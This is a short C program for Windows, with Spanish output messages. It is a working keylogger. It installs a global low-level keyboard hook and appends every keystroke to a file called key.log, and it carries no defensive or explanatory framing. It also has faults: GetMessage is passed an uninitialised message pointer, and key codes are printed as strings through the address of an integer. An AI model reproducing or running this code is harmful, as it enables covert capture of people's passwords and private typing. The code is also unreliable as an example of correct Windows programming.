#include <stdio.h>
#include <windows.h>


LRESULT CALLBACK obtieneTeclas(int code, WPARAM wParam, LPARAM lParam) {

    
    if (code == HC_ACTION && wParam == WM_KEYDOWN) {

        FILE *pFile = fopen("key.log","a+");

        LPKBDLLHOOKSTRUCT key = (LPKBDLLHOOKSTRUCT) lParam;

        printf("[+] Se ha presionado la tecla: %d = %s\n", key->vkCode, &key->vkCode);

        if (key->vkCode != 8) {

            if (key->vkCode == 13) {
                fprintf(pFile,"\n");
            }
            else {
                fprintf(pFile,"%s", &key->vkCode);
            }
        }
        

        fclose(pFile);

    }

    return CallNextHookEx(NULL, code, wParam, lParam);
}

int main(int argc, char* argv[]) {

    HHOOK resultado = SetWindowsHookExA(WH_KEYBOARD_LL, obtieneTeclas, NULL, 0);

    if (resultado == NULL) {
        printf("[!] Error al crear el Hook\n");
    }
    else {
        printf("[+] Hook creado correctamente\n");
    }


    LPMSG Msg;
    while(GetMessage(Msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(Msg);
        DispatchMessage(Msg);
    }


    return 0;
}